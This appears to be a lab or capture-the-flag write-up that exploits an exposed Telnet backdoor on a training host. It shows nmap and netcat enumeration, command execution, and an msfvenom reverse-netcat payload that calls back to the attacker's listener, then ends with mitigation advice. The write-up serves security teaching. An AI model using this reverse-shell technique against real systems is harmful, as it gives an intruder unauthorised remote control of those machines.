# Telnet

Telnet is a network protocol used to provide a command-line interface for communication with a remote device or server. It operates over TCP/IP and allows users to log into remote systems, execute commands, and manage devices as if they were directly connected to them.

### Scope:

In this exercise, I will go through the steps of performing enumeration against a target host, and how to identify unsecure protocols (Telnet) that may be enabled on a system and how to take advantage and exploit it. In this case, I will be using MSFvenm for the exploit. I will also be using Wireshark to see how the traffic generated looks like, and to also confirm that the connection has been established. 

### Tools and Technology:
Linux, MSFvenom, and Wireshark

## Enumeration:

To get started, I used Nmap to scan against the target host:

```
nmap 10.10.169.221 -Pn -sS -T5 -p- -vvv
```

![Pasted image 20240918162959](https://github.com/user-attachments/assets/d8c51f70-2762-4bf5-bcfa-27562b37045f)

Based on the output, I can see that port 8012 is open. I then tested the open port using Netcat:

```
nc 10.10.169.221 8012
```

![Pasted image 20240918163707](https://github.com/user-attachments/assets/06e2d5ee-9349-4742-8649-26bdea9d4057)

So far, based on the information gathered using Nmap and Netcat, I know that following:

+ It looks like the telnet service is running but on a non-default port (8012)
+ The service is name "Skidy's Backdoor"
+ Given the name above, it's possible that a user exists with the name "Skidy"

## Command Execution:

Given the output above, I am able to execute commands on the remote target host. To test, I used the ping command:

```
ping 10.10.8.55 -c1
```

![Pasted image 20240918154742](https://github.com/user-attachments/assets/beb4522a-3e51-47f4-aef0-faa80b60ede3)

Looking at Wireshark, I was able to get an ICMP response from the remote server, which means that I was able to execute the command successfully:

![Pasted image 20240918163559](https://github.com/user-attachments/assets/7768d463-417e-4949-bc1d-1c6cd9c6e2d7)

## MSFvenom

MSFVenom is a command-line tool that is part of the Metasploit Framework. MSFVenom can generate a wide variety of payloads, which are pieces of code that exploit vulnerabilities in target systems.

![Pasted image 20240918172441](https://github.com/user-attachments/assets/bc914b81-25bd-41be-8ac4-941158e72d4a)

Next, I generated a reverse shell payload using msfvenom:

![Pasted image 20240918162054](https://github.com/user-attachments/assets/f3b72690-3c87-471b-8ef4-90033966a292)

```
msfvenom -p cmd/unix/reverse_netcat lhost=10.10.8.55 lport=4444 R
```

This is a breakdown of the command I am using:

+ -p = payload
+ lhost = our local host IP address (this is your machine's IP address)
+ lport = the port to listen on (this is the port on your machine)
+ R = export the payload in raw format

![Pasted image 20240918155327](https://github.com/user-attachments/assets/e1ddfd39-2322-496b-8f9f-3bba3f6a930e)

Executing the reverse shell on the remote system:

![Pasted image 20240918161932](https://github.com/user-attachments/assets/1802b354-d070-4f61-8b41-8e91471a9ae9)

Next I needed to create a listening port:

![Pasted image 20240918163517](https://github.com/user-attachments/assets/29861630-18e5-41c6-aa39-4266f5d0da93)

Looking at Wireshark, I can see that the connection was established:

![Pasted image 20240918163114](https://github.com/user-attachments/assets/79363012-b260-48c8-ac5a-3bbb1dea2793)

This is a closer look at one of the packets:

![Pasted image 20240918163435](https://github.com/user-attachments/assets/432a3a52-8061-490d-8bea-f9f688c129b0)

### Summary:

In this exercise, I was able to identify the telnet service was running on the target host and exploit it using MSFvenom. For mitigation against these types of attacks, it's important to ensure that unsecure protocols such as Telnet, are disabled. If needed, you can replace Telnet with SSH for secure encrypted communications. It's also important to conduct regular security audits and vulnerability assessments to identify and mitigate potential risks associated with Telnet and other services that may be enabled/running as part of a misconfiguration. 

